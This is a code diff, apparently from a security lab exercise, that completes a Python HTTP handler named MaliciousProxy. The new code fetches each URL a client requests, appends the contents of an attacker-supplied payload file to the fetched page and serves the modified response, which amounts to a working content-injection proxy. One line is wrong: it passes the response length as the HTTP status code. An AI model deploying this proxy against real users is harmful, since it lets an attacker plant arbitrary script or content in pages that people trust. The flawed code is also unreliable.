@@ -14,11 +14,25 @@ class MaliciousProxy(http.server.SimpleHTTPRequestHandler):
         # Your code will go here
         req = urllib.request.Request(self.path)
         print(req)
-        print("test")
-        req += Payload
-        self.send_response(200)
+        print(self.path)
+        response = urllib.request.urlopen(req)
+        print(response)
+        response = response.read().decode('utf-8')
+        print(response)
+        print(sys.argv[2])
+        payload = open(sys.argv[2], "r")
+    
+        response += payload.read()
+        print(response)
+
+        response = response.encode('utf-8')
+        self.send_response(len(response))
         self.end_headers()
-        self.wfile.write(req)
+        self.wfile.write(response)
+
+
+
+
 port = int(sys.argv[1])
 server = socketserver.ThreadingTCPServer(('', port), MaliciousProxy)
 print("[*] Serving on port {}".format(port))
